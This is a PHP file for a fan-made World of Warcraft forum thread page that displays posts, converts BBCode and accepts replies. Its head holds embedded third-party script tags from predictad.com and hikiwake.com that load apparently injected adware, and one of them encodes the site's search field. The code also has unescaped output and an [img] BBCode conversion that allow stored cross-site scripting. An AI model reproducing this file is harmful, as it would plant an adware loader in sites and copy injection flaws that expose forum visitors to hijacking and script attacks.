<?php
require_once("configs.php");
$page_cat = "forums";
?>
<head>
<title><?php echo $website['title']; ?></title>
<meta content="false" http-equiv="imagetoolbar" />
<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
<link rel="shortcut icon" href="<?php echo $website['root'];?>wow/static/local-common/images/favicons/wow.ico" type="image/x-icon" />
<link rel="search" type="application/opensearchdescription+xml" href="http://eu.battle.net/en-gb/data/opensearch" title="Battle.net Search" />
<link rel="stylesheet" type="text/css" media="all" href="<?php echo $website['root'];?>wow/static/local-common/css/common.css?v15" />
<!--[if IE]><link rel="stylesheet" type="text/css" media="all" href="<?php echo $website['root'];?>wow/static/local-common/css/common-ie.css?v15" /><![endif]-->
<!--[if IE 6]><link rel="stylesheet" type="text/css" media="all" href="<?php echo $website['root'];?>wow/static/local-common/css/common-ie6.css?v15" /><![endif]-->
<!--[if IE 7]><link rel="stylesheet" type="text/css" media="all" href="<?php echo $website['root'];?>wow/static/local-common/css/common-ie7.css?v15" /><![endif]-->
<link rel="stylesheet" type="text/css" media="all" href="<?php echo $website['root'];?>wow/static/css/wow.css?v4" />
<link rel="stylesheet" type="text/css" media="all" href="<?php echo $website['root'];?>wow/static/local-common/css/cms/forums.css?v15" />
<link rel="stylesheet" type="text/css" media="all" href="<?php echo $website['root'];?>wow/static/local-common/css/cms/cms-common.css?v15" />
<link rel="stylesheet" type="text/css" media="all" href="<?php echo $website['root'];?>wow/static/css/cms.css?v4" />
<!--[if IE 6]><link rel="stylesheet" type="text/css" media="all" href="<?php echo $website['root'];?>wow/static/css/cms-ie6.css?v4" /><![endif]-->
<!--[if IE]><link rel="stylesheet" type="text/css" media="all" href="<?php echo $website['root'];?>wow/static/css/wow-ie.css?v4" /><![endif]-->
<!--[if IE 6]><link rel="stylesheet" type="text/css" media="all" href="<?php echo $website['root'];?>wow/static/css/wow-ie6.css?v4" /><![endif]-->
<!--[if IE 7]><link rel="stylesheet" type="text/css" media="all" href="<?php echo $website['root'];?>wow/static/css/wow-ie7.css?v4" /><![endif]-->
<script type="text/javascript" src="<?php echo $website['root'];?>wow/static/local-common/js/third-party/jquery-1.4.4.min.js"></script>
<script type="text/javascript" src="<?php echo $website['root'];?>wow/static/local-common/js/core.js?v15"></script>
<script type="text/javascript" src="<?php echo $website['root'];?>wow/static/local-common/js/tooltip.js?v15"></script>
<script type="text/javascript" src="<?php echo $website['root'];?>wow/static/local-common/js/cms.js"></script>
<script type="text/javascript" src="<?php echo $website['root'];?>wow/static/local-common/js/bml.js"></script>
<script type="text/javascript" src="<?php echo $website['root'];?>wow/static/local-common/js/menu.js?v15"></script>
<script type="text/javascript" src="<?php echo $website['root'];?>wow/static/js/wow.js?v4"></script>
<script type="text/javascript"> 
friendData = [];
$(function(){
Menu.initialize('data/menu.json');
Search.init('ta/lookup');
});
</script>
<!--[if lt IE 8]> <script type="text/javascript" src="<?php echo $website['root'];?>wow/static/local-common/js/third-party/jquery.pngFix.pack.js?v15"></script>
<script type="text/javascript">$('.png-fix').pngFix();</script>
<![endif]-->

<!--[if IE 6]> <script type="text/javascript">
//<![CDATA[
try { document.execCommand('BackgroundImageCache', false, true) } catch(e) {}
//]]>
</script>
<![endif]-->
<script type="text/javascript">
//<![CDATA[
Core.staticUrl = '<?php echo $website['root'];?>wow/static';
Core.baseUrl = '<?php echo $website['root'];?>wow/en';
Core.project = 'wow';
Core.locale = 'en-gb';
Core.buildRegion = 'eu';
Core.loggedIn = true;
Flash.videoPlayer = 'http://eu.media.blizzard.com/wow/player/videoplayer.swf';
Flash.videoBase = 'http://eu.media.blizzard.com/wow/media/videos';
Flash.ratingImage = 'http://eu.media.blizzard.com/wow/player/rating-pegi.jpg';
//]]>
</script>
<script type="text/javascript" src="http://cdn1.hikiwake.com/scripts/shared/enable.js?si=10203"></script><script type="text/javascript" onload="" onreadystatechange="" src="http://srchdetect4.predictad.com/scripts/acpro/?MV4xMDIwM15zZWFyY2gtZmllbGR8QHF8QHVpLWF1dG9jb21wbGV0ZS1pbnB1dHxAU2VhcmNoIHRoZSBBcm1vcnksIGZvcnVtcyBhbmQgbW9yZeKApnxAfEBvZmZ8XkZvcnVtcyAtIFdvcmxkIG9mIFdhcmNyYWZ0Xl5ec2VhcmNoLWZvcm18QHxAZ2V0fEAvd293L2VuL3NlYXJjaHxAfEAvd293L2VuL3NlYXJjaHxefHx8Xg**"></script><script type="text/javascript" onload="" onreadystatechange="" src="http://cdn1.predictad.com/scripts/acpro/bhocombined.js"></script><style type="text/css" media="screen">div.predictad ul li.selected {background-color:#D5E2FF;border:none;}</style><link class="undefined" style="display: block; " type="text/css" rel="stylesheet" href="http://cdn1.predictad.com/css/skins/mclassic.css" media="screen" /><style type="text/css" media="screen">div.predictad ul li.ad {width:99% !important;}</style></head>
<body class="en-gb logged-in"><div id="predictad_div" class="predictad" style="display: none; left: 788px; top: 104px; width: 321px; "></div>
<?php
function postX($content,$class){
switch($class){
	case "blizz":
	$content=str_replace("[quote]", "<blockquote class=\"quote-blizzard\">",$content);
	break;
	case "mvp":
	$content=str_replace("[quote]", "<blockquote class=\"quote-mvp\">",$content);
	break;
	default:
	$content=str_replace("[quote]", "<blockquote class=\"quote-public\">",$content);
	break;
}
$content=str_replace("[/quote]", "</blockquote>",$content);
$content=str_replace("[b]", "<b>",$content);
$content=str_replace("[/b]", "</b>",$content);
$content=str_replace("[i]", "<i>",$content);
$content=str_replace("[/i]", "</i>",$content);
$content=str_replace("[u]", "<u>",$content);
$content=str_replace("[/u]", "</u>",$content);
$content=str_replace("[ul]", "<ul>",$content);
$content=str_replace("[/ul]", "</ul>",$content);
$content=str_replace("[li]", "<li>",$content);
$content=str_replace("[/li]", "</li>",$content);
$content=str_replace("[code]", "<code>",$content);
$content=str_replace("[/code]", "</code>",$content);
$content=str_replace("[img]", "<img src=\"",$content);
$content=str_replace("[/img]", "\"/>",$content);
$content=str_replace("[IMG]", "<img src=\"",$content);
$content=str_replace("[/IMG]", "\"/>",$content);
return $content;
}
?>
<div id="wrapper">
<?php include("../header.php"); ?>
<div id="content">
<div class="content-top">
<div class="content-trail">
<ol class="ui-breadcrumb">
<?php
if($_GET['t'] != ""){

	$tid = intval($_GET['t']);
	$thread = mysql_fetch_assoc(mysql_query("SELECT * FROM forum_threads WHERE id = '".$tid."'"))or $error=1;
	$update = mysql_query("UPDATE forum_threads SET views = views + 1 WHERE id = '".$thread['id']."'");
	$forum = mysql_fetch_assoc(mysql_query("SELECT * FROM forum_forums WHERE id = '".$thread['forumid']."'"))or $error=1;
	$category = mysql_fetch_assoc(mysql_query("SELECT * FROM forum_categ WHERE id = '".$forum['categ']."'"))or $error=1;
	if(isset($_SESSION['username'])){
		$userInfo = mysql_fetch_assoc(mysql_query("SELECT * FROM users WHERE id = '".$account_information['id']."'"));
	}
	echo '
	<li><a href="'.$website['root'].'index.php" rel="np">World of Warcraft</a></li>
	<li><a href="index.php" rel="np">Forums</a></li>
	<li><a href="index.php" rel="np">'.$category['name'].'</a></li>
	<li><a href="forum.php?f='.$forum['id'].'" rel="np">'.$forum['name'].'</a></li>
	<li class="last"><a href="viewthread.php?t='.$thread['id'].'" rel="np">'.$thread['name'].'</a></li>
	';

	/*sweet fix*/
	$error = 0;
}else{ $error=1; }
if($error == 1){
echo '
<li><a href="'.$website['root'].'index.php" rel="np">World of Warcraft</a></li>
<li class="last"><a href="index.php" rel="np">Forums</a></li>
';
}else{
	if(isset($_POST['detail']) && $_POST['detail'] != ""){
		$reply = stripslashes($_POST['detail']);
        $reply = nl2br($reply);
		$reply = strip_tags($reply);
		$reply = addslashes($reply);
		$insert = mysql_query("INSERT INTO forum_replies (threadid,forumid,content,author,name) VALUES ('".$thread['id']."','".$forum['id']."','".mysql_real_escape_string($reply)."','".mysql_real_escape_string($account_information['id'])."','".mysql_real_escape_string($thread['name'])."')")or print("Could not post the reply!");
		$update = mysql_query("UPDATE forum_threads SET replies = replies + 1 WHERE id = '".$thread['id']."'");
		if($userInfo['class'] == "blizz"){
		$replies = mysql_fetch_assoc(mysql_query("SELECT * FROM forum_replies WHERE threadid = '".$thread['id']."' ORDER BY id DESC LIMIT 1"));
		$insert = mysql_query("INSERT INTO forum_blizzposts (type,author,postid) VALUES ('reply','".strtolower($account_information['username'])."','".$replies['id']."')");
		}
		$posted = 1;
	}
}
?>
</ol>
</div>
<div class="content-bot">
<div id="forum-content">
		<script type="text/javascript">
		//<![CDATA[
			$(function(){ Cms.Forum.threadListInit('<?php echo $thread['id']; ?>'); });
		//]]>
	    </script>
		<?php if($error == 1){ echo '
		<style type="text/css">
			.loader {
			width:24px;
			height:24px;
			background: url("../wow/static/images/loaders/canvas-loader.gif") no-repeat;
		   }
		</style>
		<center>Request thread does not exist...<br /><br /><div class="loader"> </div><br />Redirecting...</center>
		<meta http-equiv="refresh" content="2;url=index.php"/>
		';
		}else{ ?>
		
	<div id="forum-content">
		

		<!-- Title + See Blizz Post -->
		<?php
		echo'
	    <div class="section-header">
				<div class="blizzard_icon">
				<a class="nextBlizz" href="#" onmouseover="Tooltip.show(this,\'Jump to first Blizzard Post\');"></a>
				</div>
			<span class="topic">Topic</span>';
            mysql_select_db($server_adb,$connection_setup)or print($lang['error_adb']);
            $posterAccount = mysql_fetch_assoc(mysql_query("SELECT * FROM account WHERE id = '".$thread['author']."'"));
            mysql_select_db($server_db,$connection_setup)or print($lang['error_db']);
            $posterInfo = mysql_fetch_assoc(mysql_query("SELECT * FROM users WHERE id = '".$posterAccount['id']."'"));
			if($thread['prefix'] != "none"){
				echo '( '.$thread['prefix'];
				if($thread['locked'] == 1){ echo ' Locked )';}else{ echo ' )'; }
			}else{
				if($thread['locked'] == 1){ echo '( Locked )';}
			}
			echo '
			<span class="sub-title">'.$thread['name'].'</span>
        </div>
		
		<!-- Back + Add Reply -->
		<div class="forum-actions top">
		<div class="actions-panel">
		<a class="ui-button button1 imgbutton " href="#"><span><span><span class="back-arrow"> </span></span></span></a>';
		if(isset($_SESSION['username'])){
			if($thread['locked'] == 1){
				if($userInfo['class'] == ""){
					echo '<a class="ui-button button1 disabled " href="javascript:;"><span><span>Add a reply</span></span></a>';
				}else{
					echo '<a class="ui-button button1" href="javascript:;"><span><span>Add a reply</span></span></a>';
				}
			}else{
				echo '<a class="ui-button button1" href="javascript:;"><span><span>Add a reply</span></span></a>';
			}
		}else{
			echo '<a class="ui-button button1 disabled " href="javascript:;"><span><span>Add a reply</span></span></a>';
		}
		echo'		
		<span class="clear"><!-- --></span>
        </div>
		</div>

		
        <div id="thread">
			';
			switch($posterInfo['class']){
			case "blizz":
			echo '<div id="post-1" class="post blizzard">';
			break;
			case "mvp":
			echo '<div id="post-1" class="post mvp">';
			break;
			default:
			echo'<div id="post-1" class="post general">';
			break;
			}
			
			echo'
            <span id="1"></span>
            <div class="post-interior">
            <table>
			<tr>
			<td class="post-character">
			<div class="post-user">';
			
			echo'
			<div class="avatar">
                <div class="avatar-interior">
                        <a href="#">
                        	<img height="84" src="'.$website['root'].'images/avatars/2d/'.$posterInfo['avatar'].'" alt="" />
                        </a>
                </div>
            </div>';
			
			
			echo'
			<div class="character-info">
			<div class="user-name">
			<span class="char-name-code" style="display: none">'.strtolower($posterAccount['username']).'</span>
			
			<div id="context-2" class="ui-context">
				<div class="context">
					<a href="javascript:;" class="close" onclick="return CharSelect.close(this);"></a>
					<div class="context-user"><strong>'.strtolower($posterAccount['username']).'</strong></div>
					<div class="context-links">
					<a href="#" title="View posts" rel="np" class="icon-posts link-first link-last">View posts</a>
					</div>
				</div>
			</div>
			<a href="javascript:;" class="context-link" rel="np">'.strtolower($posterAccount['username']).'</a>
			</div>';
			switch($posterInfo['class']){
			case "blizz":
			echo '<div class="blizzard-title">Staff Member</div>';
			break;
			case "mvp":
			echo '<div class="mvp-title">Moderator</div>';
			break;
			default:
			echo'
			<div>
			<div class="character-desc"><span class="color-c5">No Characters</span></div>
			<div class="guild"><a href="#">No Guild</a></div>
			<div class="achievements">0</div>
            </div>';
			break;
			}
			echo'
			</div>
			</div>
			</td>
			<td>
			<!--
            <div class="post-edited">Edited by Nephadne on 05/12/10 15:59 (UTC)</div>-->
			';
			//DE  FACUT CU BBCODE
			$content=$thread['content'];
			$content=stripslashes($content);
			$content=postX($content,$posterInfo['class']);
			echo'
            <div class="post-detail">'.$content.'</div>
            </td>
			<td class="post-info">
				<div class="post-info-int">
					<div class="postData">
						<a href="#1">#1</a>
						<div class="date" onmouseover="Tooltip.show(this,\'Posted Date : '.$thread['date'].'\')">'.$thread['date'].'</div>
					</div>
					
					
					<!--<div class="blizzard_icon"><a class="nextBlizz" href="#" onmouseover="Tooltip.show(this,\'Next Blizzard Post\')"></a></div>-->
				</div>
            </td>
			</tr>
			</table>';
            if(isset($_SESSION['username'])){
				echo'
				<div class="post-options">';
				if($thread['locked'] == 1){
					if($userInfo['class'] != ""){
						echo '
						<div class="respond">
						<a class="ui-button button2 " href="#new-post">
						<span><span>Reply</span></span></a>
						<a class="ui-button button2 " href="#new-post" onclick="Cms.Topic.quote('.$thread['id'].');">
						<span><span><span class="icon-quote">Quote</span></span></span></a>
						</div>';
					}else{
						echo '<div class="no-post-options"><!-- --></div>';
					}
				}else{
					echo '
					<div class="respond">
					<a class="ui-button button2 " href="#new-post">
					<span><span>Reply</span></span></a>
					<a class="ui-button button2 " href="#new-post" onclick="Cms.Topic.quote('.$thread['id'].');">
					<span><span><span class="icon-quote">Quote</span></span></span></a>
					</div>';
				}
				echo'
				<span class="clear"><!-- --></span>
				</div>
				';
			}
			
			echo '</div></div>';
			
			$get_replies = mysql_query("SELECT * FROM forum_replies WHERE threadid = '".$thread['id']."' ORDER BY id ASC");
			if(mysql_num_rows($get_replies) > 0){
			$i=2;
			while($reply = mysql_fetch_array($get_replies)){
				mysql_select_db($server_adb,$connection_setup)or print($lang['error_adb']);
				$posterAccount = mysql_fetch_assoc(mysql_query("SELECT * FROM account WHERE id = '".$reply['author']."'"));
				mysql_select_db($server_db,$connection_setup)or print($lang['error_db']);
                $posterInfo = mysql_fetch_assoc(mysql_query("SELECT * FROM users WHERE id = '".$posterAccount['id']."'"));
				
				switch($posterInfo['class']){
				case "blizz":
				echo '<div id="post-'.$i.'" class="post blizzard">';
				break;
				case "mvp":
				echo '<div id="post-'.$i.'" class="post mvp">';
				break;
				default:
				echo'<div id="post-'.$i.'" class="post general">';
				break;
				}
				
				echo'
				<span id="'.$i.'"></span>
				<div class="post-interior">
				<table>
				<tr>
				<td class="post-character">
				<div class="post-user">';
				echo'
				<div class="avatar">
					<div class="avatar-interior">
							<a href="#">
								<img height="84" src="'.$website['root'].'images/avatars/2d/'.$posterInfo['avatar'].'" alt="" />
							</a>
					</div>
				</div>';
				
				
				echo'
				<div class="character-info">
				<div class="user-name">
				<span class="char-name-code" style="display: none">'.strtolower($posterAccount['username']).'</span>
				
				<div id="context-2" class="ui-context">
					<div class="context">
						<a href="javascript:;" class="close" onclick="return CharSelect.close(this);"></a>
						<div class="context-user"><strong>'.strtolower($posterAccount['username']).'</strong></div>
						<div class="context-links">
						<a href="#" title="View posts" rel="np" class="icon-posts link-first link-last">View posts</a>
						</div>
					</div>
				</div>
				<a href="javascript:;" class="context-link" rel="np">'.strtolower($posterAccount['username']).'</a>
				</div>';
				switch($posterInfo['class']){
				case "blizz":
				echo '<div class="blizzard-title">Staff Member</div>';
				break;
				case "mvp":
				echo '<div class="mvp-title">Moderator</div>';
				break;
				default:
				echo'
				<div>
				<div class="character-desc"><span class="color-c5">No Characters</span></div>
				<div class="guild"><a href="#">No Guild</a></div>
				<div class="achievements">0</div>
				</div>';
				break;
				}
				echo'
				</div>
				</div>
				</td>
				<td>
				<!--
				<div class="post-edited">Edited by Nephadne on 05/12/10 15:59 (UTC)</div>-->';
                $content=$reply['content'];
                $content=postX($content,$posterInfo['class']);
                       
                echo'
				<div class="post-detail">'.stripslashes($content).'</div>
				</td>
				<td class="post-info">
					<div class="post-info-int">
						<div class="postData">
							<a href="#'.$i.'">#'.$i.'</a>
							<div class="date" onmouseover="Tooltip.show(this,\'Posted Date : '.$reply['date'].'\')">'.$reply['date'].'</div>
						</div>
						
						
						<!--<div class="blizzard_icon"><a class="nextBlizz" href="#" onmouseover="Tooltip.show(this,\'Next Blizzard Post\')"></a></div>-->
					</div>
				</td>
				</tr>
				</table>
				
				<div class="post-options">';
				if(isset($_SESSION['username'])){
					if($thread['locked'] == 1){
						if($userInfo['class'] != ""){
							echo '
							<div class="respond">
							<a class="ui-button button2 " href="#new-post">
							<span><span>Reply</span></span></a>
							<a class="ui-button button2 " href="#new-post" onclick="Cms.Topic.quote('.$i.');">
							<span><span><span class="icon-quote">Quote</span></span></span></a>
							</div>';
						}else{
							echo '<div class="no-post-options"><!-- --></div>';
						}
					}else{
						echo '
						<div class="respond">
						<a class="ui-button button2 " href="#new-post">
						<span><span>Reply</span></span></a>
						<a class="ui-button button2 " href="#new-post" onclick="Cms.Topic.quote('.$i.');">
						<span><span><span class="icon-quote">Quote</span></span></span></a>
						</div>';
					}
				}				echo'
				<span class="clear"><!-- --></span>
				</div>
				</div>
				</div>';
				$i++;
			} }
			?>
			
        </div>

		<div class="talkback">
		<?php
		if(!isset($_SESSION['username'])){
			$post=0;
		}else{
			if($thread['locked'] == "1"){
				if($userInfo['class'] == ""){
					$post=0;
				}else{
					$post=1;
				}
			}else{
				$post=1;
			}
		}
		
		if($post == 1){
		?>
			<a id="new-post"></a>
			<form method="post" onsubmit="return Cms.Topic.postValidate(this);" action="#<?php echo $i++; ?>">
				<div>
				<input type="hidden" name="xstoken" value="ed99faf5-4a8e-4629-afef-393a260c3fd4" />
				<div class="post general">
				<div class="post-user-details "><h4>Reply to Thread</h4>
				<div class="post-user ajax-update">
				<div class="avatar">
				<div class="avatar-interior">
						<a href="#">
							<img height="84" src="<?php echo $website['root'];?>images/avatars/2d/<?php echo $userInfo['avatar']; ?>" alt="" />
						</a>
				</div>
				</div>
				<div class="character-info">
				<div class="user-name">
				<span class="char-name-code" style="display: none"><?php echo strtolower($_SESSION['username']); ?></span>
				<a href="#" class="context-link" rel="np"><?php echo strtolower($_SESSION['username']); ?></a>
				</div>

				<div class="userCharacter">
					<div class="character-desc">
						<span class="color-c1">
							No Characters
						</span>
					</div>
					<div class="achievements">0</div>
				</div>

				</div>
				</div>
				</div>

				<div class="post-edit">
				<div id="post-errors"></div>

				<div class="talkback-controls">
					<a href="javascript:;" onclick="Cms.Topic.previewToggle(this, 'preview')" class="preview-btn"><span class="arr"></span><span class="r"></span><span class="c">Preview</span></a>
					<a href="javascript:;" onclick="Cms.Topic.previewToggle(this, 'edit')" class="edit-btn selected"><span class="arr"></span><span class="r"></span><span class="c">Edit</span></a>
				</div>
				<div class="editor1" id="post-edit"><div class="bml-toolbar"></div>
				<a id="editorMax" rel="5000"></a>

				<textarea id="detail" name="detail" class="post-editor" cols="78" rows="13"></textarea>

				<script type="text/javascript">
				//<![CDATA[
				$(function() {
				Wow.addBmlCommands();
				BML.initialize('#post-edit', false);
				});
				//]]>
				</script>
				</div>
				<div class="post-detail" id="post-preview"></div>
				<div class="talkback-btm">
				<table class="dynamic-center">
				<tr>
				<td><div id="submitBtn">
					<button class="ui-button button1 " type="submit"><span><span>Submit</span></span></button>
				</div></td>
				</tr>
				</table>
				</div>
				</div>
				<span class="clear"><!-- --></span>
				</div>
				</div>
			</form>
			<span class="clear"><!-- --></span>
		<?php }else{ ?>
		
		<a id="new-post"></a>
		<form method="post" onsubmit="return Cms.Topic.postValidate(this);" action="#new-post">
			<div>
			<input type="hidden" name="xstoken" value="ed99faf5-4a8e-4629-afef-393a260c3fd4" />
			<div class="post general">
			<table class="dynamic-center"><tr><td>
			<?php if(isset($_SESSION['username'])){
			echo 'This thread is locked'; }else{
			echo 'In order to post you must to be logged in';
			} ?>
			</td></tr></table>
			</div>
			</div>
		</form>
		<?php } ?>
			<span class="clear"><!-- --></span>
			
			<div class="talkback-code">
				<div class="talkback-code-interior">
					<div class="talkback-icon">
						<h4 class="code-header">Please report any Code of Conduct violations, including:</h4>
						<p>Threats of violence. <strong>We take these seriously and will alert the proper authorities.</strong></p>
						<p>Posts containing personal information about other players. <strong>This includes physical addresses, e-mail addresses, phone numbers, and inappropriate photos and/or videos.</strong></p>
						<p>Harassing or discriminatory language. <strong>This will not be tolerated.</strong></p>
						<p>Click <a href="#">here</a> to view the Forums Code of Conduct.</p>
					</div>
				</div>
			</div>
		</div>
		

    </div>


		<?php } ?>
    </div>
</div>
</div>
</div>

<?php include("../footer.php"); ?>
</body>
</html>